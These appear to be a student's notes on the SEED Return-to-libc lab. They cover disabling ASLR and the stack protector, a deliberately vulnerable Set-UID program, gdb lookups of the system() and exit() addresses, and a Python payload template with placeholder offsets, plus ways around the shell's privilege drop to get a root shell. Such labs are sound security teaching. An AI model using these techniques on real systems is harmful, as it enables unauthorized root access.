# Return-to-libc Attack Lab

## Lab Link: https://seedsecuritylabs.org/Labs_20.04/Files/Return_to_Libc/Return_to_Libc.pdf

## Set up Countermeasures

### Turn off Address Space Layout Randomization

`$ sudo sysctl -w kernel.randomize_va_space=0`

### Turn off the StackGuard Protection Scheme

`$ gcc -m32 -fno-stack-protector example.c`

### Use the Non-Executable Bit
Since we're experimenting with ROP, we will enable the NX bit.
```
For executable stack:
$ gcc -m32 -z execstack -o test test.c
For non-executable stack:
$ gcc -m32 -z noexecstack -o test test.c
```

### Configuring /bin/sh

In Ubuntu 20.04, the /bin/sh symbolic link points to the /bin/dash shell. The dash shell has a countermeasure that prevents itself from being executed in a Set-UID process. It works by dropping its privilege when it is executed in a Set-UID process. And our victim program is a Set-UID program, from which our attack will use the `system` function to run a command of our choice. The `system` call will invoke `bin/sh` to run our command. Dash shell's countermeasure makes it harder for us to do privileged actions. So for this lab we will link `/bin/sh` to `zsh`.

## The Vulnerable Program

The `retlib.c` file:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifndef BUF_SIZE
#define BUF_SIZE 12
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];
    unsigned int *framep;

    // Copy ebp into framep
    asm("movl %%ebp, %0" : "=r" (framep));      

    /* print out information for experiment purpose */
    printf("Address of buffer[] inside bof():  0x%.8x\n", (unsigned)buffer);
    printf("Frame Pointer value inside bof():  0x%.8x\n", (unsigned)framep);

    strcpy(buffer, str);   

    return 1;
}

void foo(){
    static int i = 1;
    printf("Function foo() is invoked %d times\n", i++);
    return;
}

int main(int argc, char **argv)
{
   char input[1000];
   FILE *badfile;

   badfile = fopen("badfile", "r");
   int length = fread(input, sizeof(char), 1000, badfile);
   printf("Address of input[] inside main():  0x%x\n", (unsigned int) input);
   printf("Input size: %d\n", length);

   bof(input);

   printf("(^_^)(^_^) Returned Properly (^_^)(^_^)\n");
   return 1;
}
```

Compile it:
```
$ gcc -m32 -DBUF_SIZE=100 -fno-stack-protector -z noexecstack -o retlib retlib.c
$ sudo chown root retlib
$ sudo chmod 4755 retlib
```

## Task 1: Finding out the Addresses of libc Functions

We can debug the `retlibc` using gdb. 

> Even though the program is a root-owned Set-UID program, we can still debug it, except that the privilege will be dropped (i.e., the effective user ID will be the same as the real user ID).

Get the address of `system` and `exit` from libc: 
```bash
$ touch badfile
$ gdb -q retlib ➙Use "Quiet" mode
Reading symbols from ./retlib...
(No debugging symbols found in ./retlib)
gdb-peda$ break main
Breakpoint 1 at 0x1327
gdb-peda$ run
......
Breakpoint 1, 0x56556327 in main ()
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e12420 <system>
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xf7e04f80 <exit>
gdb-peda$ quit
```

These commands above can be executed in gdb's batch mode:
```bash
$ cat gdb_command.txt
break main
run
p system
p exit
quit
$ gdb -q -batch -x gdb_command.txt ./retlib
...
Breakpoint 1, 0x56556327 in main ()
$1 = {<text variable, no debug info>} 0xf7e12420 <system>
$2 = {<text variable, no debug info>} 0xf7e04f80 <exit>
```

## Task 2: Putting the shell string in the memory

We want to call `system` with `/bin/sh`. To put the string `/bin/sh` into memory, we create an env var:
```bash
$ export MYSHELL=/bin/sh
$ env | grep MYSHELL
MYSHELL=/bin/sh
```
Then we get the address of the env var by creating a program `prtenv` from the code below:
```
void main(){
   char* shell =  getenv("MYSHELL");
   if (shell)
	  printf("%x\n", (unsigned int)shell);
}
```
Note the program's filename should be the same as the `retlib` because otherwise we can't expect the env var's address to be the same between two different programs.
Also note the program should be compiled with `-m32 flag` and ASLR turned off.

## Task 3: Launching the Attack

We can use python to do the dirty work of constructing the buffer overflow payload.

```python
#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

X = 0
sh_addr = 0x00000000       # The address of "/bin/sh"
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Y = 0
system_addr = 0x00000000   # The address of system()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = 0
exit_addr = 0x00000000     # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
```

The goal is to set up the argument by putting values in the stack (note that 32-bit calling conventions, the arguments should be pushed onto the stack).

And then override the return addres of `bof`, when we return from it, we will just call `exit.`

## Task 4: Defeat the Shell's countermeasure

We need to construct your input, so when the bof() function returns, it returns to execv(), which fetches from the stack the address of the "/bin/bash" string and the address of the argv[] array. You need to prepare everything on the stack, so when execv() gets executed, it can execute"/bin/bash -p".

One catch with this method is that argv needs to end with a NULL. How do we achieve that? 

> Remember the “%n” format string which writes the number of bytes written to the address supplied to the corresponding printf() argument. We will use this and also utilize the direct access functionality of format strings.  from: https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf

The other way is to call `setuid` before calling `system`.


